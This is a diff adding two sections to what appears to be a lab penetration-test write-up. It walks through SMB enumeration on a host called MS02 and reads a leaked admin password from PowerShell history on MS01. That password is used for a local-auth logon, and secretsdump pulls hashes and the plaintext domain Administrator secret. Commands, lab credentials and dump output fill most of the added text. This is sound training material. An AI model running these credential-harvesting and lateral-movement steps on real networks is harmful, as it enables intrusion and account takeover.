@@ -141,9 +141,67 @@ only host whose token could be escalated, so `sql_svc` was the plan. Here the pl
 | MS02 | `10.10.131.148` | reachable · enumerated · **no attack in this capture** |
 | DC01 | `10.10.131.146` | not contacted yet — credential in hand |
 
-**A road not taken, and where it starts.** MS02's *local* Administrator password does not have to
-be cracked. In another pass over this same set it was sitting in a console history file. As
-`Administrator` on MS01:
+---
+
+## 11.5 `web_svc` on MS02: what the shares are worth
+
+`web_svc:Diamond1` authenticates over SMB, and the share table is a dead end on this build too —
+the same three entries chapter 01 recorded on `10.10.152.142`:
+
+```
+SMB  10.10.131.148  445  MS02      ADMIN$                          Remote Admin
+SMB  10.10.131.148  445  MS02      C$                              Default share
+SMB  10.10.131.148  445  MS02      IPC$            READ            Remote IPC
+```
+
+A blank permission column is not "denied", it is "no access": `ADMIN$` and `C$` require local
+administrator. Both were tried:
+
+```
+$ smbclient //10.10.131.148/C$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+$ smbclient //10.10.131.148/IPC$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
+NT_STATUS_NO_SUCH_FILE listing \*
+```
+
+`IPC$` is not storage. It is the endpoint SMB carries RPC over, so `READ` on it means *you may open
+pipes*, not *you may read files*. To read anything, a share has to show `READ` or `WRITE`:
+
+```bash
+smbmap -H 10.10.131.148 -u web_svc -p Diamond1 -r
+impacket-smbclient 'oscp.exam/web_svc:Diamond1@10.10.131.148'
+#   shares
+#   use C$
+#   ls
+```
+
+With `web_svc` alone there is nothing to open — the denial above is the honest end of that avenue,
+exactly as chapter 01 concluded. Shares become readable only *after* the account is a local
+administrator, which is a different chapter.
+
+What `IPC$` does buy is RPC. `impacket-lookupsid` returns MS02's local account set:
+
+```
+[*] Domain SID is: S-1-5-21-2512333080-3128024849-3533006164
+500:  MS02\Administrator (SidTypeUser)
+501:  MS02\Guest (SidTypeUser)
+503:  MS02\DefaultAccount (SidTypeUser)
+504:  MS02\WDAGUtilityAccount (SidTypeUser)
+1003: MS02\cloudbase-init (SidTypeUser)
+1004: MS02\Admin (SidTypeUser)
+```
+
+A user list, no password. It confirms `Administrator` (RID 500) exists — which is all it is good for
+until that account's password is in hand.
+
+---
+
+## 11.6 The MS02 local Administrator, end to end
+
+MS02's local `Administrator` password is not cracked and not guessed. It is **typed by an
+administrator on MS01**, into a file that records command history. As `Administrator` on MS01
+(chapter 08):
 
 ```powershell
 type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -155,13 +213,49 @@ C:\users\support\admintool.exe cmd
 shutdown /s /t 7
 ```
 
-An administrator ran a helper that takes the local-admin password as an argument, and `PSReadLine`
-kept the line. Sprayed with **local** authentication, that password opens MS02 as
-`MS02\Administrator`; MS02's own `SECURITY` hive then hands over the domain Administrator through
-`DefaultPassword` and the same DCC2 entry seen in chapter 09.
+A helper was run with the local-admin password as an argument, and `PSReadLine` kept the line. Two
+checks tie that string to MS02 rather than MS01:
 
-**This was not run in this pass.** It is recorded because it is the cheapest demonstration that
-MS02's credential store is reachable without touching MS02's services at all — and because it
-answers where that password comes from.
+1. `NTLM(hghgib6vHT3bVWf)` = `507e8b20766f720619e9f33d73756b34`, byte-for-byte MS02's SAM
+   `Administrator:500` hash. MS01's is `3c4495bb…` (`December31`) — different accounts, different
+   passwords.
+2. Presented as a **local** logon it is administrative:
+
+```
+$ nxc smb 10.10.131.148 -u Administrator -p 'hghgib6vHT3bVWf' --local-auth
+SMB  10.10.131.148  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
+SMB  10.10.131.148  445  MS02  [+] MS02\Administrator:hghgib6vHT3bVWf (Pwn3d!)
+```
+
+`--local-auth` is the whole trick. Sent to the *domain* instead (`-d oscp.exam`), `Administrator`
+resolves to the domain account, not to MS02's SAM — which is why the domain-scoped sprays in this
+run never touched it.
+
+Now the registry opens, and MS02's `SECURITY` hive pays better than its cache:
+
+```
+$ impacket-secretsdump 'Administrator':'hghgib6vHT3bVWf'@10.10.131.148
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:507e8b20766f720619e9f33d73756b34:::
+OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2023-03-02 09:08:34+00:00)
+[*] DefaultPassword
+OSCP.exam\Administrator:7Tg9M9MZbzAokR9
+```
+
+`DefaultPassword` is the domain Administrator's password **in plaintext** — the same credential the
+DCC2 entry in chapter 09 protects. On this set the cache crack is therefore optional: MS02's LSA
+secret hands over the same value without a wordlist.
+
+The per-host variation is the general lesson. On MS01 the same secret class held
+`oscp.exam\celia.almeda:7k8XHk3dMtmpnC7`; on MS02 it holds the domain Administrator. `DefaultPassword`
+is whatever the image baked in — read it on every host, not only the hashes around it.
+
+Two orderings reach the same credential:
+
+```
+MS01 SYSTEM → PSReadLine history → MS02 local Administrator → MS02 LSA secrets → domain Administrator
+MS01 SYSTEM → MS01 DCC2 cache → domain Administrator
+```
+
+This run took the second. The first needs one extra hop and no cracking at all.
 
 DC01 is next.
